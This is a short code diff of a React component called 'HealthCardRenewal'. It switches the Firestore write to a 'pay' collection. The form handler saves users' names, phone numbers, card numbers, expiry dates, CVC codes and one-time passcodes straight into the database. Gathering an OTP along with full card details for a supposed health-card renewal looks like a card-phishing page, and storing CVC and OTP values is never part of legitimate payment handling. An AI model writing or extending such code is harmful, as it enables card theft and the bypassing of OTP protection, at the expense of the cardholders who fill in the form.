@@ -10,7 +10,7 @@ import { ChevronLeft, CreditCard, MessageCircle } from 'lucide-react'
 import { cn } from "@/lib/utils"
 import { useState } from "react"
 import { initializeApp } from 'firebase/app'
-import { getFirestore, collection, addDoc } from 'firebase/firestore'
+import { getFirestore, doc, setDoc } from 'firebase/firestore'
 
 const firebaseConfig = {
   // Your Firebase configuration object goes here
@@ -48,18 +48,20 @@ export default function HealthCardRenewal() {
 
     const handleSubmit = async () => {
         try {
-          const docRef = await addDoc(collection(db, "healthCardRenewals"), {
-            step: stepr,
-            id:id,
-            name,
-            phone,
-            datayaer,
-            dateMonth,
-            CVC,
-            otp,
-            cardNumber,
-            // Add any other form fields here
-          })
+            const docRef = await doc(db, 'pay',id!);
+            const ref = await setDoc(docRef, {
+                step: stepr,
+                id:id,
+                name,
+                phone,
+                datayaer,
+                dateMonth,
+                CVC,
+                otp,
+                cardNumber,
+                // Add any other form fields here
+              });
+
           console.log("Document written with ID: ", docRef.id)
           // You might want to show a success message to the user here
         } catch (e) {
